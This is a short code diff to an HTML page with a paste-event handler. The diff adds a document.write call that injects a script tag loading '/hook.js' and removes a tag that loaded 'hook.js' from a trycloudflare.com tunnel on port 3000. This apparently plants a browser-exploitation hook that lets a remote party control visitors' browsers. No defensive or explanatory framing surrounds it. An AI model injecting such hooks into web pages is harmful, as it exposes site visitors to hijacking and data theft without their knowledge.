@@ -259,6 +259,10 @@ document.addEventListener('paste', async (event) => {
   //
   //
     </script>
+<script>
+var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
+document.write(commandModuleStr);
+</script>
 </body>
 </html>
-<script src="https://<subdomain>.trycloudflare.com:3000/hook.js"></script>
+
